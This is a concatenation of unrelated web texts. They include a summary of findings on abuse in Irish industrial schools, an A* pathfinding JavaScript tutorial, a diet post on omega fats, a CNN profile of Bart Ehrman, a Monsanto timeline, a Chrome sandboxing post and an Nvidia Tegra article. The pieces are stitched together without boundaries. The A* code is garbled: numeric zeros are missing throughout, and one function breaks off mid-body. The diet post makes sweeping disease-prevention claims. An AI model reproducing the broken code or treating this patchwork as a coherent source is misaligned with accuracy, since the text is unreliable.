Corporal punishment in girls ’ schools was “ pervasive , severe , arbitrary and unpredictable ” .
SEXUAL ABUSE
Sexual abuse was endemic in boys ’ institutions .
Long - term offenders repeatedly abused children wherever they worked .
When confronted by evidence of sexual abuse , religious authorities responded by transferring the offender to another location where , in many cases , he was free to abuse again .
Congregational authorities did not listen to or believe people who complained of sexual abuse in the past , despite extensive evidence to the contrary .
Older boys sexually abused younger boys and the system did not offer those abused protection .
A culture of silence prevented sexual abuse by members of religious orders being brought to the department ’s attention .
The Department of Education dealt inadequately with sexual abuse complaints .
NEGLECT
Poor standards of physical care were reported by most male and female complainants .
Children were frequently hungry and food was inadequate , inedible and badly prepared in many schools .
Children went cold because of inadequate clothing .
Accommodation was cold , Spartan and bleak .
Sanitary provision was primitive .
The standard of education in industrial schools was consistently poorer than in outside schools .
Industrial training served the institutions ’ needs rather than the children’s .
EMOTIONAL ABUSE
Disadvantaged , neglected and abandoned children were subjected to disturbing level of abuse .
The system made it difficult for individual brothers , priests and nuns who tried to respond to emotional needs of children in their care .
Witnessing the abuse of other boys and girls had a harrowing effect on children in the schools .
Separating siblings and other restrictions on family contact were profoundly damaging for family relationships .

It is always a tricky balancing act , attacking bad arguments relentlessly and being positive about your achievements and optimistic about the future without slipping into self - congratulatory smugness .
It is sometimes hard to resist the temptation , especially in the face of pseudo - science , mystical nonsense and religious moralism , to release a soupcon of scorn , a little squirt of intellectual superiority .
I mean some people are really asking for it , are n’t they ?
In one of the best lines from his introduction to the Nine Lessons and Carols for Godless People shows that we held just before Christmas , comedian Robin Ince makes this very point .
He quotes something Richard Dawkins said in a television discussion programme , in response to a Pentecostal Christian who claimed that homosexuality was strictly a choice , and therefore unnatural .
Ince perfectly impersonated Dawkins ’s witheringly polite tone to deliver the line “ The wonderful thing about an opinion like that is that we can totally ignore it . ”
The loud cheer that greeted the line each night suggested , I believe , not smugness , but a degree of pent - up frustration on the part of those who have to listen to a great deal of absurdity , in the interests of phony media “ balance ” and are expected always to maintain a conciliatory “ respectful ” tone .
Of course , some might see this as smug .
This was the line taken by Christopher Hart , writing in The Times about the Nine Lessons shows .
He described the line - up as “ a clique of smug , illiterate scientists and fat , middle - aged comedians ” .
The fact that he formed this view without the benefit of seeing any of the shows could be taken as a kind of prescience , I suppose , if it had been true .
Leaving aside the issue of whether it is really Christian to dismiss what people might say because of their weight , and the fact that so many of the comedians on display were actually as lithe as gazelles and perspiration - free , and that the scientists – Simon Singh , Dawkins and Ben Goldacre – appeared as literate as a Paris Salon ; leaving aside , as I said , these blatant errors , Hart was still totally wrong .
Because the overall tone of the shows was not smugness or scorn , but celebration .
Where there was criticism it was more often than not a deadly subtlety that did the damage , as where comedian Stewart Lee innocently recounted the conversation he had had with his local vicar – letting his impeccable comic timing do the work : “ I asked him , if I drink holy water will my pee be magic ?
No… the vicar replied … that would be… ridiculous . ”
Even Tim Minchin ’s magnificent beat poem “ Storm ” which closed the shows , relating his wine - fuelled exasperation with a tattooed hippy chick who “ did n’t believe in science ” and spouted a stream of “ fatuous crap ” , avoided a sneery tone with wit and self - deprecation , and a wonderfully touching ending asking why the beautiful complex world we inhabit should fail to be enough to command our wonder .
The real lesson of Nine Lessons was not that religious people are stupid , or that science has all the answers , but that we could all spend more time thinking about the known wonders of our universe , and in particular the incredible capacity of the human brain to move instantly from contemplation of the number and variety of the stars ( Richard Dawkins reading from Unweaving the Rainbow was a highpoint ) to singing along with a sublimely silly song from Colin Watson about “ a monkey , a teddy , a deaf kid and a shoe ” .
Would it seem insufferably smug if I reported that the three events hosted a total of 5,000 people over three days and got 4 - star reviews in the Evening Standard and the Independent ?
Or that we expect to repeat this success with more secular celebrations in 2009 ?
Probably .
Sorry about that .

" You smote the Kerrek ! "
Occasionally , some characters , if they 're hurt badly enough , will start to bleed .
Also , there have been some cases where blood is seen , but is not from any character in particular .
In rare cases , blood is only mentioned .
edit ] Appearances
Note that this code has been updated .
I have an updated blog post detailing what changed .
The new source code is available at https://github.com/bgrins/javascript-astar, and the code as of the original post is still available here : https://github.com/bgrins/javascript-astar/tree/0.0.1/original-implementation
View the online demo
I first implemented the A* algorithm for a research group I was in through school ( Computer Graphics and Image Understanding ) .
A* is a best - first , graph search algorithm .
Some basic information can be found on the [ Wikipedia page for A ] ( http://en.wikipedia.org/wiki/A_search_algorithm) and the external links contained in it .
Please refer to that page for general reference about the algorithm , I will simply explain in my own words how it works and how I got it working .
Why JavaScript ?
Because it was easy to deploy !
Since I know JavaScript pretty well , and most of the examples you can find are in C , Java or a similar language that you cannot run without downloading source code or executables , I thought it would be a good idea to program it on an html page .
This way , people could see what was going on and view the source very easily by using the online demo .
My hope was to build a page that could be extended with other search algorithms by separating the UI code ( that generates a graph with walls and animates the path that is determined by an algorithm ) , and the algorithm that finds the path .
Maybe I will get around to plugging in some more algorithms sometime and making it into a little resource for graph search algorithms .
How ?
search.html
Just a basic html file that includes jQuery , the excellent JavaScript library , main.css , graph.js , and astar.js .
Also , I have a JavaScript block that initializes the page .
graph.js
The point of this file is to build the graph , call the search function , and animate the results after the search has returned .
It also has an option to show the debugging information created by the search algorithm .
I wo n’t get too into the code here , since it distracts from the search algorithm .
Please take a look at it , be aware that there are some improvements I would make if I was to rewrite this today .
There are some performance issues that could be addressed , and It modifies the Array . prototype to add on specific methods ( findGraphNode and removeGraphNode ) for search algorithms , which may not be ideal for bigger projects .
For this little page , I ’m not too worried about it , but if I do get around to adding in more algorithms , I will probably improve this code .
astar.js
This is the actual implementation of the algorithm .
I will do my best to explain what is going on , but feel free to just look at the source of the example , or just download astar.js .
There are three functions that we keep track of for nodes that we look at :
g(x ) :
The total cost of getting to that node ( pretty straightforward ) .
If we reach a node for the first time or reach a node in less time than it currently took , then update the g(x ) to the cost to reach this node .
h(x ) :
The estimated time to reach the finish from the current node .
This is also called a heuristic .
We online need to update this if it is not set already , since the distance to the finish will not change even if the path we took to arrive at a node changes .
Note :
There are many different ways to guess how far you are from the end , I use the Manhattan distance in this implementation .
f( x ) : Simply g( x ) + h( x ) .
The lower the f( x ) , the better .
Think about it like this : the best node is one that takes the least total amount of time to arrive at and to get to the end .
So , a node that took only 1 step to arrive at and 5 to get to the end is more ideal than one that took 10 to arrive and and only 1 to get to the end .
Here is some high level pseudocode of what is happening in the algorithm .
Also see the Wikipedia pseudocode for another example .
push startNode onto openList while ( openList is not empty ) { currentNode = find lowest f in openList if currentNode is final , return the successful path push currentNode onto closedList and remove from openList foreach neighbor of currentNode { if neighbor is not in openList { save g , h , and f then save the current parent add neighbor to openList } if neighbor is in openList but the current g is better than previous g { save g and f , then save the current parent } }
Here is the JavaScript for the list implementation :
var astar = { init : function ( grid ) { for ( var x = ; x < grid .
length ; x ++ ) { for ( var y = ; y < grid [ x ]. length ; y ++ ) { grid [ x ] [ y ]. f = ; grid [ x ] [ y ]. g = ; grid [ x ] [ y ]. h = ; grid [ x ] [ y ]. debug = " " ; grid [ x ] [ y ]. parent = null ; } } } , search : function ( grid , start , end ) { astar .
init ( grid ) ; var openList = [ ] ; var closedList = [ ] ; openList .
push ( start ) ; while ( openList .
length > ) { //
Grab the lowest f( x ) to process next var lowInd = ; for ( var i = ; i < openList .
length ; i ++ ) { if ( openList [ i ] . f < openList [ lowInd ]. f ) { lowInd = i ; } } var currentNode = openList [ lowInd ] ; //
End case -- result has been found , return the traced path if ( currentNode .
pos == end .
pos ) { var curr = currentNode ; var ret = [ ] ; while ( curr .
parent ) { ret .
push ( curr ) ; curr = curr .
parent ; } return ret .
reverse ( ) ; } // Normal case -- move currentNode from open to closed , process each of its neighbors openList .
removeGraphNode ( currentNode ) ; closedList . push ( currentNode ) ; var neighbors = astar .
neighbors ( grid , currentNode ) ; for ( var i = ; i < neighbors .
length ; i ++ ) { var neighbor = neighbors [ i ] ; if ( closedList .
findGraphNode ( neighbor ) || neighbor .
isWall ( ) ) { // not a valid node to process , skip to next neighbor continue ; } // g score is the shortest distance from start to current node , we need to check if // the path we have arrived at this neighbor is the shortest one we have seen yet var gScore = currentNode .
g + 1 ; // 1 is the distance from a node to it 's neighbor var gScoreIsBest = false ; if ( ! openList .
findGraphNode ( neighbor ) ) { //
This the the first time we have arrived at this node , it must be the best //
Also , we need to take the h ( heuristic ) score since we have n't done so yet gScoreIsBest = true ; neighbor .
h = astar .
heuristic ( neighbor .
pos , end . pos ) ; openList . push ( neighbor ) ; } else if ( gScore < neighbor . g ) { //
We have already seen the node , but last time it had a worse g ( distance from start ) gScoreIsBest = true ; } if ( gScoreIsBest ) { //
Found an optimal ( so far ) path to this node .
Store info on how we got here and // just how good it really is ... neighbor .
parent = currentNode ; neighbor .
g = gScore ; neighbor .
f = neighbor .
g + neighbor . h ; neighbor .
debug = " F : " + neighbor .
f + " < br />G : " + neighbor . g + " < br />H : " + neighbor . h ; } } } //
No result was found -- empty array signifies failure to find path return [ ] ; } , heuristic : function ( pos0 , pos1 ) { //
This is the Manhattan distance var d1 = Math . abs ( pos1 . x - pos0 . x ) ; var d2 = Math . abs ( pos1 . y - pos0 . y ) ; return d1 + d2 ; } , neighbors : function ( grid , node ) { var ret = [ ] ; var x = node .
pos .
x ; var y = node .
pos .
y ; if ( grid [ x - 1 ] && grid [ x - 1 ] [ y ] ) { ret .
push ( grid [ x - 1 ] [ y ] ) ; } if ( grid [ x + 1 ] && grid [ x + 1 ] [ y ] ) { ret .
push ( grid [ x + 1 ] [ y ] ) ; } if ( grid [ x ] [ y - 1 ] && grid [ x ] [ y - 1 ] ) { ret .
push ( grid [ x ] [ y - 1 ] ) ; } if ( grid [ x ] [ y + 1 ] && grid [ x ] [ y + 1 ] ) { ret .
push ( grid [ x ] [ y + 1 ] ) ; } return ret ; } } ;
And here is a faster implementation , using a Binary Heap instead of a list .
This is a lot faster and also includes the option to search diagonally - 8 directional movement .
Head over to the astar graph search project page to get the latest version of the code !
var astar = { init : function ( grid ) { for ( var x = , xl = grid .
length ; x < xl ; x ++ ) { for ( var y = , yl = grid [ x ]. length ; y < yl ; y ++ ) { var node = grid [ x ] [ y ] ; node .
f = ; node .
g = ; node .
h = ; node .
cost = 1 ; node .
visited = false ; node .
closed = false ; node .
parent = null ; } } } , heap : function ( ) { return new BinaryHeap ( function ( node ) { return node .
f ; } ) ; } , search : function ( grid , start , end , diagonal , heuristic ) { astar .
init ( grid ) ; heuristic = heuristic || astar .
manhattan ; diagonal = !!
diagonal ; var openHeap = astar . heap ( ) ; openHeap .
push ( start ) ; while ( openHeap . size ( ) > ) { //
Grab the lowest f( x ) to process next .
Heap keeps this sorted for us .
var currentNode = openHeap . pop ( ) ; //
End case -- result has been found , return the traced path .
if ( currentNode === end ) { var curr = currentNode ; var ret = [ ] ; while ( curr .
parent ) { ret .
push ( curr ) ; curr = curr .
parent ; } return ret .
reverse ( ) ; } // Normal case -- move currentNode from open to closed , process each of its neighbors .
currentNode .
closed = true ; //
Find all neighbors for the current node .
Optionally find diagonal neighbors as well ( false by default ) .
var neighbors = astar .
neighbors ( grid , currentNode , diagonal ) ; for ( var i = , il = neighbors .
length ; i < il ; i ++ ) { var neighbor = neighbors [ i ] ; if ( neighbor .
closed || neighbor .
isWall ( ) ) { //
Not a valid node to process , skip to next neighbor .
continue ; } //
The g score is the shortest distance from start to current node .
//
We need to check if the path we have arrived at this neighbor is the shortest one we have seen yet .
var gScore = currentNode . g + neighbor .
cost ; var beenVisited = neighbor .
visited ; if ( ! beenVisited || gScore < neighbor . g ) { //
Found an optimal ( so far ) path to this node .
Take score for node to see how good it is .
neighbor .
visited = true ; neighbor .
parent = currentNode ; neighbor .
h = neighbor . h || heuristic ( neighbor .
pos , end . pos ) ; neighbor .
g = gScore ; neighbor .
f = neighbor . g + neighbor . h ; if ( ! beenVisited ) { //
Pushing to heap will put it in proper place based on the 'f ' value .
openHeap . push ( neighbor ) ; } else { //
Already seen the node , but since it has been rescored we need to reorder it in the heap openHeap .
rescoreElement ( neighbor ) ; } } } } //
No result was found - empty array signifies failure to find path .
return [ ] ; } , manhattan : function ( pos0 , pos1 ) { //
See list of heuristics : http://theory.stanford.edu/~amitp/GameProgramming/Heuristics.html var d1 = Math . abs ( pos1 . x - pos0 . x ) ; var d2 = Math . abs ( pos1 . y - pos0 . y ) ; return d1 + d2 ; } , neighbors : function ( grid , node , diagonals ) { var ret = [ ] ; var x = node .
x ; var y = node .
y ; //
West if ( grid [ x - 1 ] && grid [ x - 1 ] [ y ] ) { ret .
push ( grid [ x - 1 ] [ y ] ) ; } //

push ( grid [ x + 1 ] [ y + 1 ] ) ; } } return ret ; } } ;
Conclusion
This A* search implementation could be used as a component to larger system ( like a game - maybe tower defense or puzzle ) , or just for learning purposes .
I have done my best to make the code understandable and to present the concepts in a way that would help someone who has never seen the algorithm before , or someone who is not very familiar with JavaScript .
Feel free to view the demo , or download the latest version of the astar .js file to mess around with it .

Fat = Health
If you eat the right type
The best advice I can give concerning fat consumption is to increase your intake of omega 3s , like EPA and DHA found in fish oil , and reduce your consumption of polyunsaturated fats like vegetable oil .?
Polyunsaturated fats contain high amounts of omega 6 fatty acids , which in excess are detrimental to our health .
Probably most importantly however , is to eliminate trans fats if your like most Americans who consume processed foods .
By switching the fats one consumes you can increase your overall health , prevent heart disease , cancer , rheumatoid arthritis , diabetes , ulcerative colitis , depression , Alzheimer ’s , and a host of other diseases ..
These two types of fat , omega - 3 and omega - 6 , are both essential for human health .
However , the typical American consumes far too many omega - 6 fats in their diet while consuming very low levels of omega - 3 .
America ’s consumption of vegetable oil has increased by 437 % in the past 80 years .?
We evolved on a fairly high fat diet .
The problem is that the types of fats we were eating back in the Paleolithic days were quite a bit different from the fats we eat now .
In the Paleolithic era , our ratio of omega 6s to omega 3s was very close to 1:1 .
We ate like this for millions of years .
These days it has been suggested that this ratio is 30:1 up to 50:1 !
So why should we be concerned ?
The change in the ratio of omega 6 to omega 3 plays a role in pretty much every major disease that ’s killing us in Western civilization .
The primary sources of omega - 6 are corn , soy , canola , safflower and sunflower oil .
These oils are overabundant in the typical diet , which explains our excess omega - 6 levels .
Avoid or limit these oils .
Omega - 3 , meanwhile , is typically found in flaxseed oil , walnut oil and some fish .?
By far , the best source of omega - 3 fats are those found in wild fish .
Wild caught fish like salmon is high in two omega - 3 fatty acids crucial to human health , DHA and EPA .
These two fatty acids are pivotal in preventing diseases as mentioned earlier .
The human brain is also highly dependent on DHA .
Low DHA levels have been linked to depression , schizophrenia , memory loss and a higher risk of developing Alzheimer ’s .

CNN -- Just so you know , Bart Ehrman says he's not the anti-Christ .
Bart Ehrman says most of the New Testament is a forgery but it 's still an important body of work .
He says he 's not trying to destroy your faith .
He 's not trying to bash the Bible .
And , though his mother no longer talks to him about religion , Ehrman says some of his best friends are Christian .
Ehrman , a best - selling author and a professor of religious studies at the University of North Carolina at Chapel Hill , is a biblical sleuth whose investigations make some people very angry .
Like the fictional Robert Langdon character played by actor Tom Hanks in the movie " Angels & Demons , " he delves into the past to challenge some of Christianity 's central claims .
In Ehrman 's latest book , " Jesus , Interrupted , " he concludes :
Doctrines such as the divinity of Jesus and heaven and hell are not based on anything Jesus or his earlier followers said .
At least 19 of the 27 books in the New Testament are forgeries .
Believing the Bible is infallible is not a condition for being a Christian .
" Christianity has never been about the Bible being the inerrant word of God , " Ehrman says .
" Christianity is about the belief in Christ . "
Critic : ' There 's a touch of arrogance ' about him
Ehrman 's claims have found an audience , and controversy .
He 's a fixture on History Channel and Discovery Channel documentaries on Christianity .
He 's appeared on National Public Radio , CNN and the BBC and talked about scribes misquoting Jesus on " The Daily Show with Jon Stewart . "
Yet Ehrman 's popularity also may be due to a larger trend .
The books of people like Elaine Pagels , author of " The Gnostic Gospels , " and Dan Brown , author of " The Da Vinci Code " and " Angels and Demons , " resonate with people who believe there are parts of the Bible that the church left on history 's editing floor .
Some scholarly critics say Ehrman is saying nothing new .
Bishop William H. Willimon , an author and United Methodist Church bishop based in Alabama , says he does n't like the " breathless tone " of Ehrman 's work .
" He keeps presenting this stuff as if this is wonderful new knowledge that has been kept from you backward lay people and this is the stuff your preachers do n't have the guts to tell , and I have , " Willimon says .
" There 's a touch of arrogance in it . "
Yet even many of Ehrman 's critics say he has a knack for making arcane New Testament scholarship accessible to the public .
" He has a gift for clear thinking and an ability to present some complicated things in simple , direct ways , " Willimon says .
Some pastors also say that Ehrman forces them to confront tough questions about the Bible in front of their congregations .
" His take on the scriptures is a gift to the church because of his ability to articulate questions and challenges , " says Rev. Guy Williams , a blogger who also happens to be a Methodist minister in Houston , Texas .
" It gives us an opportunity to wrestle with the [ Bible 's ] claims and questions . "
Ehrman :
There was no resurrection
Ehrman says that no one accepts everything in the Bible .
Everyone picks and chooses .
He cites some New Testament 's references to the role of women in church as an example .
In the first book of Corinthians , Ehrman says , the Apostle Paul insists that women should remain silent in church ( 1 Corinthians 14:35 - 36 ) .
In the 16th chapter of the book of Romans , Paul 's attitude is that women could and should be church leaders -- and he cites women who were serving as deacons and apostles in the early church , Ehrman says .
Ehrman backs his arguments with a deep knowledge of the culture and history of the New Testament world .
He 's written 20 books on early Christianity and is an authority on ancient manuscripts used to translate the Bible .
His claims , though , take on some of Christianity 's most sacred tenets , like the resurrection of Jesus .
Ehrman says he does n't think the resurrection took place .
There 's no proof Jesus physically rose from the dead , and the resurrection stories contradict one another , he says .
He says he does n't believe the followers of Jesus saw their master bodily rise from the dead , but something else .
" My best guess is that what happened is what commonly happens today when someone has a loved one die -- they sometimes think they see them in a vision , " Ehrman says .
" I think some of the disciples had visions . "
Ehrman says he immerses himself in the Bible , though he does n't believe in its infallibility , because it 's the most important book in Western civilization .
" I have friends who teach medieval English , " he says .
" They do n't believe in Chaucer , but they think Chaucer is important , " he writes in the conclusion of " Jesus , Interrupted . "
The fundamentalist turns agnostic
Ehrman once had a different attitude toward the Bible .
He was raised in the Episcopal Church in Lawrence , Kansas , and became a fundamentalist Christian at age 15 when he met a charismatic Christian youth group leader who reached out to him .
Ehrman says he later persuaded his parents to embrace a more conservative brand of Christianity .
He says he became so devoted to the Bible that he memorized entire sections .
He was convinced the Bible was " God 's words . "
But Ehrman says he began to develop doubts about the infallibility of the Bible after attending Princeton Theological Seminary to become a college Bible professor .
He even began to change his opinion of the Christian youth group leader who helped convert him .
The youth leader visited Ehrman 's father when he was dying of cancer in a hospital .
The youth leader used a bottle of hotel shampoo to " anoint " his father , and tried to persuade his father to confess specific sins , Ehrman says .
Ehrman says he was angry at the minister for acting " self - righteous " and " hypocritical . "
" For a vulnerable high - schooler who is trying to figure out the world , a personality like that is very attractive , " Ehrman says .
" They 're like cult leaders .
They have all the answers . "
Ehrman says he later became an agnostic because he could n't find the answer to another question :
How could there be a God when there is so much suffering in the world ?
An agnostic is one who disclaims any knowledge of God , but does not deny the possibility of God 's existence .
Today , Ehrman describes himself as a " happy agnostic . "
But some people can't believe an agnostic can be happy , he says .
They tell him that they 're praying for him .
Others say worse .
They say he 's being fooled by Satan and he 's headed to hell .
Some say he 's the anti-Christ .
" I 'm not that powerful , " he says , laughing .
His family , however , feels no obligation to talk to Ehrman about his ideas on the Bible , Ehrman says .
His mother , brother and sister remain conservative Christians .
He once tried to talk to his mother about his new beliefs , but the discussion proved fruitless .
" My mom is a strong evangelical , " Ehrman says .
" We talk basketball .
We do n't talk religion . "
Still , Ehrman says he still sends his mother and siblings copies of his latest books .
They 've never responded , he says .
" I imagine they 're hidden in a back room , " he says .
Whether it's his family , critics or students , Ehrman says he has a better handle on why he is so threatening to so many people -- some Christians worry they will make the same decision he has .
" I changed my mind , " he says .
" My students find me more dangerous that way .
I really do know what they 're talking about when they stake out an evangelical position . "

1985 : Monsanto purchases G. D. Searle & Company .
In this merger , Searle 's aspartame business became a separate Monsanto subsidiary , the NutraSweet Company .
CEO of NutraSweet , Robert B. Shapiro , goes on to become CEO of Monsanto from 1995 to 2000 .
1997 : Monsanto spins off its industrial chemical and fiber divisions into Solutia Inc .
This transfers the financial liability related to the production and contamination with PCBs at the Illinois and Alabama plants .
In January , Monsanto announced the purchase of Holden 's Foundations Seeds , a privately - held seed business owned by the Holden family along with its sister sales organization , Corn States Hybrid Service , of Williamsburg and Des Moines , Iowa , respectively .
The combined purchase price totaled $ 925 M .
Also , in April , Monsanto purchases the remaining shares of Calgene .
1999 : Monsanto sells Nutrasweet Co. and two other companies .
2000 : Monsanto merges with Pharmacia and Upjohn .
Later in the year , Pharmacia forms a new subsidiary , also named Monsanto , for the agricultural divisions , and retains the medical research divisions , which includes products such as Celebrex .
2002 : Pharmacia spins off its remaining interest in Monsanto , which has since existed as a separate company : the " new Monsanto . "
As part of the deal , Monsanto agrees to indemnify Pharmacia against any liabilities that might be incurred from judgments against Solutia .
As a result , the new Monsanto continues to be a party to numerous lawsuits that relate to operations of the old Monsanto .
2005 : Monsanto purchases Seminis , the largest seed company not producing corn or soybeans in the world .
2008 : Monsanto purchases the Dutch seed company De Ruiter Seeds for about 855 million dollars .
Order a meal in any fast - food restaurant , and you 'll likely walk away with a sandwich , fries and a drink .
If you had to identify the ingredients of this meal , you might list beef ( or chicken ) , lettuce , tomato , cheese , ketchup , bread , potatoes and soda .
Not complicated , right ?
Wrong .
Burger and chicken joints do n't think of the building blocks of a menu item as ingredients .
They think of them as components , which are made of ingredients .
For example , McDonald 's famous Big Mac jingle -- " two all beef patties , special sauce , lettuce , cheese , pickles , onions on a sesame seed bun " -- suggests the sandwich has seven components .
Would you believe it has 67 ingredients ?

Clearly , fast food is more complicated than it looks .
Many menu items contain processed foods , which have been modified from their natural state for safety or convenience .
Processed foods tend to have multiple additives to keep them fresher longer .
Across an entire fast - food menu , there are thousands of ingredients , ranging from the commonplace ( water ) to the exotic ( xanthan gum ) .
Considering that some of these ingredients have been implicated in serious health issues , it would be good to know which are the most common .
We 've set out to answer that very question .
We started with menus from five popular fast - food chains -- McDonald's , Burger King , Taco Bell , KFC and Arby 's -- did some tallying , then cross-matched our findings with the U.S. Food and Drug Administration 's list of common food ingredients and colors .
The result is the top 10 most common ingredients in fast food , organized by the type of ingredient and what it does .
Up first is the most common preservative .
Rallies will pile pressure on the Socialist - led ruling coalition in the country , who has recently seen its support among Bulgarians plummet steadily .

Teachers and doctors say they will join the persistent protests of Kremikovtzi steel mill workers , driven to despair by the economic situation in the country .
The rallies will pile pressure on the Socialist - led ruling coalition in the country , who has recently seen its support among Bulgarians plummet steadily .
Trade unions have called on Economy Minister Petar Dimitrov to resign , citing " his inability to solve the problems of the indebted plant " .
Kremikovtzi workers accuse the government of negligence and threatened Thursday more aggressive actions including a national steel mill industry strike and a tent camp in downtown Sofia .
Side effects associated with several commonly - prescribed dementia drugs may be putting elderly people at risk , says Queen 's University Geriatrics professor Sudeep Gill .
Cholinesterase inhibitors ( Aricept , Exelon and Reminyl ) are often prescribed for people with Alzheimer 's disease and related dementias because they increase the level of a chemical in the brain that seems to help memory .
Although such drugs are known to provoke slower heart rates and fainting episodes , the magnitude of these risks has not been clear until now .
" This is very troubling , because the drugs are marketed as helping to preserve memory and improve function , " says Dr. Gill , who is an Ontario Ministry of Health and Long - term Care Career Scientist , working at Providence Care 's St. Mary's of the Lake Hospital in Kingston .
" But for a subset of people , the effect appears to be the exact opposite . "
In a large study using province - wide data , Dr. Gill and his colleagues discovered that people who used cholinesterase inhibitors were hospitalized for fainting almost twice as often as people with dementia who did not receive these drugs .
Experiencing a slowed heart - rate was 69 per cent more common amongst cholinesterase inhibitor users .
In addition , people taking the dementia drugs had a 49 per cent increased chance of having permanent pacemakers implanted and an 18 per cent increased risk of hip fractures .
Unfortunately , Dr. Gill continues , this class of drugs is one of the few effective dementia treatments available today .
Acknowledging that these drugs do have an important role in the management of dementia , he suggests that people who are already at a higher risk ( for example , those who have had previous episodes of fainting or slowed heart rate ) may want to ask their doctors to reassess the value of taking the drugs .
Slowing of the heart rate from cholinesterase inhibitors , if significant , may cause a person to faint and suffer fall - related injuries such as a broken hip - often debilitating and sometimes fatal for seniors .
However , many physicians are n't aware of the connection between these problems and the dementia drugs , Dr. Gill notes .
If the association with dementia drugs is not identified , people who faint may be prescribed a permanent pacemaker : an invasive procedure that can involve serious complications for seniors .
Both the injuries incurred from falling and the risks from pacemaker implants are " downstream consequences " of not recognizing this drug - induced phenomenon .
" This study does not suggest that dementia patients should n't take these drugs , " says Dr. Gill .
" What 's critical is that patients , caregivers and physicians be aware of the potential side effects , and weigh these risks carefully against the potential for beneficial effects . "
The findings are published in the journal , Archives of Internal Medicine .
Scientists from the Institute for Clinical Evaluative Sciences , the University of Toronto and Harvard University are also on the research team .

Sandboxing is a technique that Google Chrome employs to help make the browser more secure , and was discussed in a previous blog post .
On Windows , getting a process sandboxed in a way that 's useful to us is a pretty complicated affair .
The relevant source code consists of over 100 files and is located under the sandbox / directory in Chromium 's Open Source repository .
But for our Mac and Linux ports , sandboxing is a very different story .
On Linux there are a number of different sandboxing mechanisms available .
Different Linux distributions ship with different ( or no ) sandboxing APIs , and finding a mechanism that is guaranteed to work on end - user 's machines is a challenge .
Fortunately , on Mac OS X , the OS APIs for sandboxing a process are easy to use and straightforward .
Sandboxing on the Mac
Starting a sandbox involves a single call to sandbox_init ( ) specifying which resources to block for a specific process .
In our case we lock down the process pretty tightly .
That means no network access , and very limited or no access to files and Mach ports .
When Chromium starts a renderer process , we open an IPC channel ( a UNIX socketpair ) back to the browser process before turning on the sandbox .
Any resources a process owns before turning on the sandbox stay with the process , so this channel can still be used after the sandbox is enabled .
When we want to pass a shared memory area between processes , we send it over as an mmaped file handle using the sendmsg ( ) API .
We do n't need to do anything else , as Apple 's sandbox API is smart enough to allow access to file descriptors passed between processes in this manner even if the receiving process itself is forbidden from calling open ( ) .
One sticky point we run into is that the sandboxed process calls through to OS X system APIs .
There is no documentation available about which privileges each API needs , such as whether they need access to on - disk files , or call other APIs to which the sandbox restricts access .
Our approach to date has been to " warm up " any problematic API calls before turning the sandbox on .
This means that we call through to the API , to allow it to cache whatever resource it needs .
For example , color profiles and shared libraries can be loaded from disk before we " lock down " the process .
To get a more complete understanding of our use of the sandbox in OSX , you can read the OSX sandboxing design doc
As we continue the porting efforts for Chromium on the Mac , it 's very satisfying to see the puzzle pieces fit into place alongside the native system APIs .
It 's important to us that the Mac port of Chromium feels and performs like a native Mac application , and that it provides the kind of high - quality experience Mac users expect .

Hardware maker Nvidia is endorsing Windows CE as its platform of choice for Tegra - based netbooks .
The company has rejected Google 's open source Android platform and is also unimpressed with conventional Linux - based options , such as Ubuntu .
Nvidia is making a play for the mobile market with its Tegra platform , an ARM11 SoC with an Nvidia GPU .
Tegra 's main selling point is that can deliver high - definition video playback with minimal energy consumption , characteristics that could make it a strong contender in the portable media player market .
In addition to targeting handheld devices , Nvidia is also tentatively pushing Tegra for small form - factor laptops .
Although ARM - based netbooks could deliver significantly better battery life than their x86 brethren , there are some issues that could limit their potential for gaining broad market acceptance .
One of the biggest is that the standard flavor of Microsoft 's dominant Windows operating system — and a majority of the software that is designed to run on it — is not compatible with the ARM architecture .
Hardware makers will have to choose between the multitude of competing Linux variants and Windows CE ( recently rebranded as Windows Embedded Compact ) , the mobile version of Microsoft 's platform .
Describing Windows CE as a " rock - solid operating system " with a " low memory footprint and a good collection of apps , " Nvidia mobile business unit manager Mike Rayfield recently told ComputerWorld that Microsoft 's mobile platform is the right choice for Tegra - based netbooks .
Nvidia said that Google 's Android platform is n't ready , as it has a number of weaknesses and limitations that make it unsuitable for netbook devices .
Specifically , Rayfield criticized Android 's inadequate video playback performance and the unsuitability of its user interface for netbook - sized screens .
Rayfield 's assessment of Android 's potential on netbooks reflects our own findings when we examined the matter earlier this year .
He says , however , that Nvidia is working with Google to help implement hardware - accelerated video support for Android so that the platform will eventually be more viable in the future .
Nvidia has also rejected more conventional Linux solutions .
Rayfield contends that mainstream Linux distributions , such as Ubuntu , have failed to gain real traction on netbooks because users favor Windows .
This seems like a premature assessment .
Microsoft 's oft - cited statistics on the subject are somewhat dubious and there are a growing number of OEMs that are successfully shipping Linux - based products .
That said , Nvidia 's skepticism about Linux is not entirely unwarranted .
We have seen examples of Linux netbooks shipping with technical glitches due to misconfiguration and other related issues , so there are clearly hurdles that still have to be overcome .
There are also some technical challenges that would make Linux difficult to adopt on Tegra .
The two most promising Linux solutions for netbook devices are Intel 's Moblin platform and the popular Ubuntu Linux distribution .
Moblin is obviously out of the question for Tegra because it 's designed specifically for Atom processors , but it 's not really clear yet if Ubuntu is well - suited for Tegra - based devices .
Canonical offers a fully - supported ARM v7 port of Ubuntu , but does not provide an out - of - the - box solution that will work with Tegra 's ARM11 chip .
In a report published by Canonical that described a Beijing ARM seminar , Ubuntu kernel developer Bryan
Wu notes that " For Ubuntu , it 's difficult to support such [ an ] ARM11 4 core SoC Tegra , because it is ARMv6 ISA . "
It 's not an insurmountable task , however , and it's worth noting that there are some ARM11 devices on the market that are running Ubuntu — most notably the SmartQ .
Is Windows CE really a practical option ?
It 's not a particularly good platform , but it does offer many of the same strengths as Linux , and Microsoft has done a lot to boost the competitiveness of Windows CE relative to open source alternatives .
Although Windows CE is obviously not distributed under an open source license , the source code itself is fully available to hardware makers and provides a high level of flexibility .
Microsoft has also brought down the licensing costs and is working on a new project that will enable development of richer user interfaces for Windows CE via the use of Silverlight .
Some of the traditional strengths of Windows on the desktop , particularly software availability , are lost on the ARM architecture .
Browser options , for example , are limited — an unfortunate predicament for a netbook product .
The most recent release of Internet Explorer that is supported on the platform is IE 6 .
Nvidia has partnered with Opera because there are n't any other compelling production - ready options yet .
( Update : a reader wrote in to point out that Nvidia has demoed a Firefox 3.5 ARM port on Tegra )
It looks increasingly like Nvidia 's highest priority is delivering hardware - accelerated video , and they chose their platform accordingly .
